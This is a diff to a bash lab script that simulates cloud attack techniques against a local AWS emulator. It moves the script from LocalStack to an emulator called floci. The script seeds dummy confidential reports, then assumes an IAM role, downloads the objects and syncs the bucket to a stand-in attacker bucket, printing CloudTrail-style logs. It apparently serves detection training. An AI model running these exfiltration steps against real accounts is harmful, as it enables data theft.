@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# simulate.sh — fire attacker-like API calls against LocalStack and print
+# simulate.sh — fire attacker-like API calls against the floci emulator and print
 # CloudTrail-shaped JSON for each technique.
 #
 # Usage (inside the lab container):
@@ -8,11 +8,11 @@
 #   ./simulate.sh --technique s3-download
 #   ./simulate.sh --technique s3-exfil
 #
-# Requires: awslocal (awscli-local), jq
+# Requires: aws (honors AWS_ENDPOINT_URL), jq
 
 set -euo pipefail
 
-ENDPOINT="${AWS_ENDPOINT_URL:-http://localstack:4566}"
+ENDPOINT="${AWS_ENDPOINT_URL:-http://floci:4566}"
 ACCOUNT_ID="123456789012"
 REGION="us-east-1"
 SOURCE_BUCKET="financial-reports-prod"
@@ -62,32 +62,32 @@ EOF
 }
 
 # --------------------------------------------------------------------------
-# Seed LocalStack with minimal resources (idempotent)
+# Seed floci with minimal resources (idempotent)
 # --------------------------------------------------------------------------
-seed_localstack() {
-  echo "==> Seeding LocalStack environment..." >&2
+seed_emulator() {
+  echo "==> Seeding floci environment..." >&2
 
   # IAM role (may already exist — ignore errors)
-  awslocal iam create-role \
+  aws iam create-role \
     --role-name DataPipelineRole \
     --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::123456789012:root"},"Action":"sts:AssumeRole"}]}' \
     --endpoint-url "$ENDPOINT" 2>/dev/null || true
 
-  awslocal iam attach-role-policy \
+  aws iam attach-role-policy \
     --role-name DataPipelineRole \
     --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess \
     --endpoint-url "$ENDPOINT" 2>/dev/null || true
 
   # Source bucket with seed objects
-  awslocal s3 mb "s3://${SOURCE_BUCKET}" --endpoint-url "$ENDPOINT" 2>/dev/null || true
+  aws s3 mb "s3://${SOURCE_BUCKET}" --endpoint-url "$ENDPOINT" 2>/dev/null || true
   for i in 1 2 3 4 5; do
     echo "the target account Q${i} report — CONFIDENTIAL" | \
-      awslocal s3 cp - "s3://${SOURCE_BUCKET}/reports/Q${i}-earnings.txt" \
+      aws s3 cp - "s3://${SOURCE_BUCKET}/reports/Q${i}-earnings.txt" \
       --endpoint-url "$ENDPOINT" 2>/dev/null || true
   done
 
   # Exfil staging bucket (simulates attacker-controlled account)
-  awslocal s3 mb "s3://${EXFIL_BUCKET}" --endpoint-url "$ENDPOINT" 2>/dev/null || true
+  aws s3 mb "s3://${EXFIL_BUCKET}" --endpoint-url "$ENDPOINT" 2>/dev/null || true
 
   echo "==> Seed complete." >&2
 }
@@ -103,7 +103,7 @@ technique_assume_role() {
   echo "============================================================"
 
   # Fire the real LocalStack API call
-  awslocal sts assume-role \
+  aws sts assume-role \
     --role-arn "$ROLE_ARN" \
     --role-session-name "attacker-session-$(date +%s)" \
     --endpoint-url "$ENDPOINT" > /tmp/assume-role-output.json 2>/dev/null || true
@@ -138,12 +138,12 @@ technique_s3_download() {
   echo "============================================================"
 
   # List objects and download each
-  OBJECTS=$(awslocal s3 ls "s3://${SOURCE_BUCKET}/reports/" --endpoint-url "$ENDPOINT" 2>/dev/null \
+  OBJECTS=$(aws s3 ls "s3://${SOURCE_BUCKET}/reports/" --endpoint-url "$ENDPOINT" 2>/dev/null \
     | awk '{print $4}' || true)
 
   COUNT=0
   for obj in $OBJECTS; do
-    awslocal s3 cp "s3://${SOURCE_BUCKET}/reports/${obj}" /tmp/ \
+    aws s3 cp "s3://${SOURCE_BUCKET}/reports/${obj}" /tmp/ \
       --endpoint-url "$ENDPOINT" 2>/dev/null || true
     COUNT=$((COUNT + 1))
   done
@@ -181,7 +181,7 @@ technique_s3_exfil() {
   echo "============================================================"
 
   # Fire a sync to the exfil bucket (simulates replication/transfer)
-  awslocal s3 sync "s3://${SOURCE_BUCKET}" "s3://${EXFIL_BUCKET}" \
+  aws s3 sync "s3://${SOURCE_BUCKET}" "s3://${EXFIL_BUCKET}" \
     --endpoint-url "$ENDPOINT" 2>/dev/null || true
 
   echo ""
@@ -218,7 +218,7 @@ technique_s3_exfil() {
 # --------------------------------------------------------------------------
 TECHNIQUE="${1:-all}"
 
-seed_localstack
+seed_emulator
 
 case "$TECHNIQUE" in
   "--technique=assume-role"|"--technique" )
